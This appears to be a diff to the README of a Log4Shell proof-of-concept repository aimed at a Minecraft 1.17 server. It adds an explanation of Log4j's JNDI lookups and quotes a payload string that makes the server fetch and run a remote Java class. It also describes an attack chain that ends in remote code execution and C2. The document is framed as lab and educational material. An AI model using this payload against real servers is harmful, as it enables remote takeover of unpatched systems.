@@ -1,4 +1,4 @@
-# Log4Shell (CVE-2021-44228) PoC — Minecraft 1.17.1 on Ubuntu Linux
+# Log4Shell (CVE-2021-44228) PoC — Minecraft 1.17 on Ubuntu Linux
 
 > **For authorized security research and educational purposes only. Run entirely on a local VM.**
 
@@ -8,11 +8,32 @@
 
 Log4Shell abuses Log4j's JNDI lookup feature. When Minecraft logs a chat message containing `${jndi:ldap://...}`, Log4j 2.14.1 processes it, reaches out to your LDAP server (marshalsec), which redirects it to your HTTP server hosting a malicious Java class. That class executes on the Minecraft server JVM.
 
+![Attack Diagram](Log4Shell.png)
+
+
 **Attack chain:**
 ```
 Minecraft chat input → Log4j 2.14.1 JNDI lookup → marshalsec LDAP server
   → Python HTTP server → Exploit.class fetched → RCE on server
 ```
+## A Deeper Dive
+
+CVE-2021-44228, seen at https://nvd.nist.gov/vuln/detail/CVE-2021-44228 is a **10.0 Critical** vulnerability discovered in the widely-used **Log4J** Java logging library. This library was used across numerous high-profile Java projects, notably in this case, Minecraft versions 1.7 to 1.18 (https://www.minecraft.net/en-us/article/important-message--security-vulnerability-java-edition). 8 years!
+
+This vulnerability was uncovered in 2021, and developers scrambled to quickly secure their applications. There are two inherent reasons that the vulnerability existed.
+
+The first is a Log4J feature called **Lookups**. This feature allows logs to be enriched by enclosing platform-specific info in the logs, like `${java.os}` to the OS version.
+
+This combined with another 'feature', the ability to **query remote JNDI (Java Naming and Directory) servers** to fetch unknown classes. Input sanitization was not used for these logs, and a payload like:
+```
+${jndi:ldap://127.0.0.1:1389/Exploit}
+```
+
+would be interpreted by Log4J and reach out to the remote server, grab the implant class, and execute it on the host machine.
+
+In Minecraft's case, custom Java edition servers run by players were highly vulnerable, and could be triggered by simply entering the payload in a chat message.
+
+In this repository, we walk through the necessary steps to execute the entire kill chain, from setup to implant and C2, and show just how devastating the Log4Shell exploit was and still continues to be.
 
 ---
 
